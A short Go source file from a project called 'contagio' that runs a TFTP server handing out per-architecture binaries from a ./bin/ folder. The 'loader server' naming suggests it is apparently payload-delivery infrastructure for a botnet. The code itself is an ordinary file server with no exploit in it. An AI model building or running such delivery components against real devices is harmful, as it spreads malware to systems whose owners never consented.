package loader_server

import (
	"contagio/contagio/config"
	"errors"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/pin/tftp/v3"
)

func StartTftp(config *config.Config) {

	s := tftp.NewServer(Sendtftp, nil)
	s.SetTimeout(5 * time.Second)

	fmt.Println("[contagio] Tftp server ready: " + config.TftpServer)
	err := s.ListenAndServe(config.TftpServer)
	if err != nil {
		fmt.Println("[contagio] Tftp fatal error: " + err.Error())
		config.Wg.Done()
		return
	}
}

func Sendtftp(filename string, rf io.ReaderFrom) error {
	checkpath := func() bool {
		for _, i := range Archs {
			if "./bin/"+i == filename {
				return true
			}
		}
		return false
	}()

	if !checkpath {
		return errors.New("fuck u")

	}

	file, err := os.Open(filename)
	if err != nil {
		return err
	}

	_, err = rf.ReadFrom(file)
	if err != nil {
		return err
	}

	if !config.Release {
		fmt.Printf("[tftp] %s sent\n", filename)
	}

	return nil
}
